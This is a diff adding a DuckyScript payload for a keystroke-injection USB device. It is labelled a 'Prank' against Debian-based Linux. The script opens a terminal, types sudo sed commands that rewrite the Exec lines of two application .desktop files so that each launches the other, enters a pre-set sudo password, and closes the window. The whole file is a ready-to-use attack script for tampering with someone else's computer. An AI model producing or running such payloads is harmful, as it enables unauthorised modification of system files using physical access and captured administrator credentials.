@@ -1,0 +1,46 @@
+REM #######################################################
+REM #                                                     |
+REM # Title        : Change The App That Will Be Runned   |
+REM # Author       : Aleff                                |
+REM # Version      : 1.0                                  |
+REM # Category     : Prank                                |
+REM # Target       : GNU/Linux (Debian based tested)      |
+REM #                                                     |
+REM #######################################################
+
+
+REM Requirements:
+REM     - sudo permissions
+
+
+REM You must know the original desktop name file, if you don't know it you can rich this information download the app on you system and going to /usr/share/applications/ searching this one app, i.e. the desktop file name of Signal application is signal-desktop.desktop, so in this case you should put signal-desktop.desktop
+DEFINE ORIGINAL_DESKTOP_FILE_NAME_1 example
+DEFINE ORIGINAL_DESKTOP_EXEC_COMMAND_1 example
+DEFINE ORIGINAL_DESKTOP_FILE_NAME_2 example
+DEFINE ORIGINAL_DESKTOP_EXEC_COMMAND_2 example
+
+REM sudo permissions needed
+DEFINE SUDO example
+
+
+REM Open a shell
+DELAY 2000
+CTRL-ALT t
+DELAY 1000
+
+STRING sudo sed -i '/^Exec=/s/.*/
+STRING ORIGINAL_DESKTOP_EXEC_COMMAND_2
+STRING /' 
+STRINGLN ORIGINAL_DESKTOP_FILE_NAME_1
+DELAY 500
+
+STRING SUDO
+ENTER
+DELAY 4000
+
+STRING sudo sed -i '/^Exec=/s/.*/
+STRING ORIGINAL_DESKTOP_EXEC_COMMAND_1
+STRING /' 
+STRINGLN ORIGINAL_DESKTOP_FILE_NAME_2
+DELAY 1000
+ALT f4
